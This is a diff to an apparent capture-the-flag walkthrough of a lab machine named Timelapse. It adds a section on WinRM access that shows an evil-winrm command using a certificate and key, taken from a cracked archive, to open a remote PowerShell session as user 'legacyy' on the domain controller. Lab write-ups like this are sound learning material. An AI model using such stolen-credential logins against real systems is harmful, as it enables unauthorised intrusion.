@@ -258,6 +258,8 @@ Session completed
 ```
 The hash cracked
 
+# Access over winrm as `legacyy`
+
 ![](Pasted%20image%2020260613183940.png)
 
 After opening the file in my archive manager and entering the password i see there is an RSA key
@@ -269,5 +271,14 @@ After opening the file in my archive manager and entering the password i see the
 ```
 Now ill run these two commands to extract the data i need from it
 
-
+```python
+# evil-winrm -i dc01.timelapse.htb -u legacyy -c legacyy.pem -k legacyy.key -S
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\legacyy\Documents> 
+```
 
